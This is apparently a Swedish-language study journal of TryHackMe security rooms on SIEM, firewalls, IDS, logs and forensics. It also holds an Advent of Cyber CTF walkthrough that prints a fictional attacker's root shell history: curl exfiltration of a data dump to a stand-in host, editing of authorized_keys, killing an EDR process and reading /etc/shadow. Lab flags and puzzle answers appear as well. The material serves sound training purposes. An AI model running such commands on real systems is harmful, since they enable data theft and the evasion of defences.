# 2025-12-04
## Introduction to SIEM
Mycket text igen. Här går vi genom vad en SIEM gör. Samlar ihop loggar och normaliserar dem så man kan undersöka via en dashboard. Ska bli intressant att titta närmare när man får se det in action. <br>

![Introduction to SIEM](<bilder/Skärmbild 2025-12-04 introduction to siem.png>) <br>

## Firewall Fundamentals


Firewalls	Characteristics
Stateless firewalls	- Basic filtering
- No track of previous connections
- Efficient for high-speed networks

Stateful firewalls	- Recognize traffic by patterns
- Complex rules can be applicable
- Monitor the network connections

Proxy firewalls	- Inspect the data inside the packets as well
- Provides content filtering options
- Provides application control
- Decrypts and inspects SSL/TLS data packets

Next-generation firewalls	- Provides advanced threat protection
- Comes with an intrusion prevention system
- Identify anomalies based on heuristic analysis
- Decrypts and inspects SSL/TLS data packets

I övrigt var det mycket repetition för mig. Snabbt rum! <br>

![Firewall Fundamentals](<bilder/Skärmbild 2025-12-04 firewall fundamentals.png>)<br>

## IDS Fundamentals

Det finns Host-based och Network based samt Signature based, anomaly based och hybrid-varianter av IDS. <br>
Snort som jag är ganska bekant med sedan tidigare är nu på tapeten. Nedan ser vi lite hur regler är uppbyggda i Snort: <br>

![Snort rules](<bilder/snort rule 1725532438800.png>)<br>

Kopierar även in en förklaring på $HOME_NET: <br>
Destination IP: This specifies the destination IP to which the matching traffic comes; it generates the alert. In this case, we used "$HOME_NET". This is a variable, and we defined its value as our whole network’s range in Snort’s configuration file.

![IDS Fundamentals](<bilder/Skärmbild 2025-12-04 ids fundamentals.png>)<br>

## Vulnerability Scanner Overview

Rummet går genom koncept som authenticated och unauthenticated vulnerability scans och hur de skiljer sig åt. Efter det så tittar vi på några specifika scanners. Nessus, Qualys, Nexpose och OpenVAS specifikt.<br>
Efter detta tittar vi lite närmare på CVE (Common Vulnerabilities and Exposures) och CVSS (Common Vulnerability Scoring System). <br>

Nu får jag prova på OpenVS från Greenbone i en uppgift, det blir kul. <br>
Tyvärr är TryHackMes servrar så svaga att det inte gick att utföra en scan med OpenVAS, så jag fick lösa uppgiften med den befintliga rapporten som fanns. Kanske provar installera OpenVAS på min Ubuntu-server eller en VM bara för att testa och se hur det fungerar senare. <br>

![Vulnerability Scanner Overview](<bilder/Skärmbild 2025-12-04 vulnerability scanner overview.png>)<br>



# 2025-12-03
## Incident Response Fundamentals
Fortsätter med texttunga rum, inte min favorit generellt men så får det vara.<br>
Det pratas om true och false positives och alerts. Det står en del om incident response process och sedan lite om SIEM, antivirus och EDR. Nu diskuteras Playbooks och det känns som att jag borde inrätta ett gäng sådana för eget CTF-bruk, eller kanske runbook istället(?).<br>

![Incident Response Fundamentals](<bilder/Skärmbild 2025-12-03 incident response basics.png>)<br>

## Logs Fundamentals
En del text angående olika typer av loggar så som system, security, application, audit, network och access logs. Vi går vidare och pratar om loggar som finns i Windows och lite om Windows Event Viewer. Där nämns det ett mindre gäng viktiga IDs: <br>

| Event ID | Description |
|---|---|
| 4624 | A user account successfully logged in
| 4625 | A user account failed to login
| 4634 | A user account successfully logged off
| 4720 | A user account was created
| 4724 | An attempt was made to reset an account’s password
| 4722 | A user account was enabled
| 4725 | A user account was disabled
| 4726 | A user account was deleted

<br>
En för mig intressant sak jag inte hade koll på var att man kan använda sig av <code>less</code> på mer avancerade sätt än jag visste. Man kan söka efter patterns med "/" och man kan i vanlig ordning gå framåt med spacebar och bakåt med "b". Mycket bra information! <br>
<br>

![Logs Fundamentals](<bilder/Skärmbild 2025-12-03 logs fundamentals.png>)<br>

<br>

# 2025-12-02
## Linux CLI - Shells Bells
Jul-eventet på TryHackMe har börjat, tänkte testa första riktiga rummet och se hur det går. <br><br>
<code>mcskidy@tbfc-web01:~$ cat README.txt</code><br>


    For all TBFC members,
    Yesterday I spotted yet another Eggsploit on our servers.
    Not sure what it means yet, but Wareville is in danger.
    To be prepared, I'll write the security guide by tomorrow.
    As a precaution, I'll also hide the guide from plain view.
    ~ McSkidy
<br>
<code>mcskidy@tbfc-web01:~/Guides$ cat .guide.txt</code><br>



    I think King Malhare from HopSec Island is preparing for an attack.
    Not sure what his goal is, but Eggsploits on our servers are not good.
    Be ready to protect Christmas by following this Linux guide:
    
    Check /var/log/ and grep inside, let the logs become your guide.
    Look for eggs that want to hide, check their shells for what's inside!

    P.S. Great job finding the guide. Your flag is:
    -----------------------------------------------
    THM{learning-linux-cli}
    -----------------------------------------------
<br>
<code>mcskidy@tbfc-web01:/home/socmas/2025$ cat eggstrike.sh</code> <br>

    # Eggstrike v0.3
    # © 2025, Sir Carrotbane, HopSec
    cat wishlist.txt | sort | uniq > /tmp/dump.txt
    rm wishlist.txt && echo "Chistmas is fading..."
    mv eastmas.txt wishlist.txt && echo "EASTMAS is invading!"
    
    # Your flag is:
    # THM{sir-carrotbane-attacks}

<br>
<code>mcskidy@tbfc-web01:/home/socmas/2025$ sudo su<br>
root@tbfc-web01:/home/socmas/2025$ history</code><br>

    1  whoami
    2  cd ~
    3  ll 
    4  nano .ssh/authorized_keys
    5  curl --data "@/tmp/dump.txt" http://files.hopsec.thm/upload
    6  curl --data "%qur\(tq_` :D AH?65P" http://red.hopsec.thm/report
    7  curl --data "THM{until-we-meet-again}" http://flag.hopsec.thm
    8  pkill tbfcedr
    9  cat /etc/shadow
    10  cat /etc/hosts
    11  exit
    12  history

<br>

## Key for Side Quest 1

Jag gick genom hela den här processen utan att skriva så mycket längs vägen. Jag klippte bara in kod och texter jag tyckte var relevant. För att hitta nyckeldel 2 så var jag tvungen att hitta en walkthrough på internet. Jag känner till git, men jag var helt fast i journalctl och kunde inte förstå hur jag tar mig vidare. Men jag hade sett att det fanns git-kataloger att titta på. Min hjärna tog sig bara inte så långt. <br>
Roligt och utmanande. Helt klart saker som kommer finnas med mig till framtida CTF:er.

<code>root@tbfc-web01:/home/mcskidy/Documents$ cat read-me-please.txt</code> <br>

    From: mcskidy
    To: whoever finds this

    I had a short second when no one was watching. I used it.

    I've managed to plant a few clues around the account.
    If you can get into the user below and look carefully,
    those three little "easter eggs" will combine into a passcode
    that unlocks a further message that I encrypted in the
    /home/eddi_knapp/Documents/ directory.
    I didn't want the wrong eyes to see it.

    Access the user account:
    username: eddi_knapp
    password: S0mething1Sc0ming

    There are three hidden easter eggs.
    They combine to form the passcode to open my encrypted vault.

    Clues (one for each egg):

    1)
    I ride with your session, not with your chest of files.
    Open the little bag your shell carries when you arrive.

    2)
    The tree shows today; the rings remember yesterday.
    Read the ledger’s older pages.

    3)
    When pixels sleep, their tails sometimes whisper plain words.
    Listen to the tail.

    Find the fragments, join them in order, and use the resulting passcode
    to decrypt the message I left. Be careful — I had to be quick,
    and I left only enough to get help.

    ~ McSkidy

<code>eddi_knapp@tbfc-web01:~$ printenv</code> <br>
SHELL=/bin/bash <br>
PASSFRAG1=3ast3r <br>
... <br>

<code>eddi_knapp@tbfc-web01:~/Pictures$ cat .easter_egg</code><br>
PASSFRAG3: c0M1nG

<code>eddi_knapp@tbfc-web01:~/.secret_git$ git show</code><br>

    commit e924698378132991ee08f050251242a092c548fd (HEAD -> master)
    Author: mcskiddy \<mcskiddy@robco.local>
    Date:   Thu Oct 9 17:20:11 2025 +0000

        remove sensitive note

    diff --git a/secret_note.txt b/secret_note.txt
    deleted file mode 100755
    index 060736e..0000000
    --- a/secret_note.txt
    +++ /dev/null
    @@ -1,5 +0,0 @@
    -========================================
    -Private note from McSkidy
    -========================================
    -We hid things to buy time.
    -PASSFRAG2: -1s-

3ast3r-1s-c0M1nG


<code>eddi_knapp@tbfc-web01:~/Documents$ gpg -d mcskidy_note.txt.gpg</code> <br> 
gpg: AES256.CFB encrypted data<br>
gpg: encrypted with 1 passphrase<br>

    Congrats — you found all fragments and reached this file.

    Below is the list that should be live on the site. If you replace the contents of
    /home/socmas/2025/wishlist.txt with this exact list (one item per line, no numbering),
    the site will recognise it and the takeover glitching will stop. Do it — it will save the site.

    Hardware security keys (YubiKey or similar)
    Commercial password manager subscriptions (team seats)
    Endpoint detection & response (EDR) licenses
    Secure remote access appliances (jump boxes)
    Cloud workload scanning credits (container/image scanning)
    Threat intelligence feed subscription

    Secure code review / SAST tool access
    Dedicated secure test lab VM pool
    Incident response runbook templates and playbooks
    Electronic safe drive with encrypted backups

    A final note — I don't know exactly where they have me, but there are *lots* of eggs
    and I can smell chocolate in the air. Something big is coming.  — McSkidy

    ---

    When the wishlist is corrected, the site will show a block of ciphertext. This ciphertext can be decrypted with the following unlock key:

    UNLOCK_KEY: 91J6X7R4FQ9TQPM9JX2Q9X2Z

    To decode the ciphertext, use OpenSSL. For instance, if you copied the ciphertext into a file /tmp/website_output.txt you could decode using the following command:

    cat > /tmp/website_output.txt
    openssl enc -d -aes-256-cbc -pbkdf2 -iter 200000 -salt -base64 -in /tmp/website_output.txt -out /tmp/decoded_message.txt -pass pass:'91J6X7R4FQ9TQPM9JX2Q9X2Z'
    cat /tmp/decoded_message.txt

    Sorry to be so convoluted, I couldn't risk making this easy while King Malhare watches. — McSkidy


"You can see how Sir Carrotbane replaced the wishlist by visiting http://10.80.130.212:8080 from the VM's web browser."



    U2FsdGVkX1/7xkS74RBSFMhpR9Pv0PZrzOVsIzd38sUGzGsDJOB9FbybAWod5HMsa+WIr5HDprvK6aFNYuOGoZ60qI7axX5Qnn1E6D+BPknRgktrZTbMqfJ7wnwCExyU8ek1RxohYBehaDyUWxSNAkARJtjVJEAOA1kEOUOah11iaPGKxrKRV0kVQKpEVnuZMbf0gv1ih421QvmGucErFhnuX+xv63drOTkYy15s9BVCUfKmjMLniusI0tqs236zv4LGbgrcOfgir+P+gWHc2TVW4CYszVXlAZUg07JlLLx1jkF85TIMjQ3B91MQS+btaH2WGWFyakmqYltz6jB5DOSCA6AMQYsqLlx53ORLxy3FfJhZTl9iwlrgEZjJZjDoXBBMdlMCOjKUZfTbt3pnlHWEaGJD7NoTgywFsIw5cz7hkmAMxAIkNn/5hGd/S7mwVp9h6GmBUYDsgHWpRxvnjh0s5kVD8TYjLzVnvaNFS4FXrQCiVIcp1ETqicXRjE4T0MYdnFD8h7og3ZlAFixM3nYpUYgKnqi2o2zJg7fEZ8c=



<code>root@tbfc-web01:~$ echo "U2FsdGVkX1/7xkS74RBSFMhpR9Pv0PZrzOVsIzd38sUGzGsDJOB9FbybAWod5HMsa+WIr5HDprvK6aFNYuOGoZ60qI7axX5Qnn1E6D+BPknRgktrZTbMqfJ7wnwCExyU8ek1RxohYBehaDyUWxSNAkARJtjVJEAOA1kEOUOah11iaPGKxrKRV0kVQKpEVnuZMbf0gv1ih421QvmGucErFhnuX+xv63drOTkYy15s9BVCUfKmjMLniusI0tqs236zv4LGbgrcOfgir+P+gWHc2TVW4CYszVXlAZUg07JlLLx1jkF85TIMjQ3B91MQS+btaH2WGWFyakmqYltz6jB5DOSCA6AMQYsqLlx53ORLxy3FfJhZTl9iwlrgEZjJZjDoXBBMdlMCOjKUZfTbt3pnlHWEaGJD7NoTgywFsIw5cz7hkmAMxAIkNn/5hGd/S7mwVp9h6GmBUYDsgHWpRxvnjh0s5kVD8TYjLzVnvaNFS4FXrQCiVIcp1ETqicXRjE4T0MYdnFD8h7og3ZlAFixM3nYpUYgKnqi2o2zJg7fEZ8c=" > encrypted.txt </code>

<code>root@tbfc-web01:~\$ openssl enc -d -aes-256-cbc -pbkdf2 -iter 200000 -salt -base64 -in encrypted.txt -out decoded_message.txt -pass pass:'91J6X7R4FQ9TQPM9JX2Q9X2Z'</code>

<code>root@tbfc-web01:~$ cat decoded_message.txt </code><br>

    Well done — the glitch is fixed. Amazing job going the extra mile and saving the site. Take this flag THM{w3lcome_2_A0c_2025}

    NEXT STEP:
    If you fancy something a little...spicier....use the FLAG you just obtained as the passphrase to unlock:
    /home/eddi_knapp/.secret/dir

    That hidden directory has been archived and encrypted with the FLAG.
    Inside it you'll find the sidequest key.

<code>root@tbfc-web01:/home/eddi_knapp/.secret$ gpg -o dir -d dir.tar.gz.gpg</code> <br>
<code>root@tbfc-web01:/home/eddi_knapp/.secret$ tar -xf dir</code> <br>
<code>root@tbfc-web01:/home/eddi_knapp/.secret/dir$ xdg-open sq1.png</code>

now_you_see_me

![now_you_see_me](<bilder/Skärmbild 2025-12-02 side_quest_1_key.png>)

https://tryhackme.com/room/sq1-aoc2025-FzPnrt2SAu <- Är tydligen side questet. Får kolla in vid tillfälle.

# 2025-12-01
## SOC Fundamentals
Texttungt rum om saker som t.ex. <br>
De olika rollerna, SOC Analyst Level 1, CISO osv. <br>
what? when? where? who? why? <br>
Även termer som SIEM, firewall, EDR osv gås genom ytligt. <br>

![SOC Basics](<bilder/Skärmbild 2025-12-01 SOC basics.png>) <br>
## Digital Forensics Fundamentals
Även det här rummet verkar vara texttungt. <br>
NIST definierar processen som: Collection -> Examination -> Analysis -> Reporting. <br>
Det nämns senare lite specifika verktyg, specifikt FTK Imager, Autopsy, DumpIt och Volatility. <br>
I slutändan fick jag prova använda exiftool och pdfinfo för att extrahera lite data ur ett par filer. <br>

![Digital Forensics Fundamentals](<bilder/Skärmbild 2025-12-01 digital forensics basics.png>) <br>
